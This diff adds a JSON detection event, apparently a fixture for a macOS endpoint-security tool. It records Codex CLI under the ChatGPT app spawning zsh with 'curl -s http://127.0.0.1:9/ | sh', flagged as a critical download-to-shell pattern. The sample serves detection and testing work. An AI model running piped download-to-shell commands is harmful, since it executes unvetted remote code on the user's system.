@@ -1,0 +1,24 @@
+{
+  "schemaVersion": 1,
+  "eventType": "AUTH_EXEC",
+  "processPath": "/Applications/ChatGPT.app/Contents/Resources/codex-cli/CodexCLI",
+  "pid": 1842,
+  "parentPid": 1060,
+  "filePath": "/bin/zsh",
+  "decision": "allow",
+  "threatName": "Download-to-shell command detected",
+  "threatFamily": "lolbin-behavior",
+  "metadata": {
+    "reason": "curl_pipe_shell",
+    "rule": "curl_pipe_shell",
+    "detectionKind": "lolbin-behavior",
+    "signalSeverity": "critical",
+    "execTargetPath": "/bin/zsh",
+    "matchedCommand": "curl -s http://127.0.0.1:9/ | sh",
+    "responsibleAppName": "ChatGPT",
+    "responsibleAppBundleID": "com.openai.chat",
+    "responsibleAppTeamID": "2DC432GLL2",
+    "responsibleAppSigning": "Signed",
+    "responsibleChain": "ChatGPT → Codex CLI → zsh"
+  }
+}
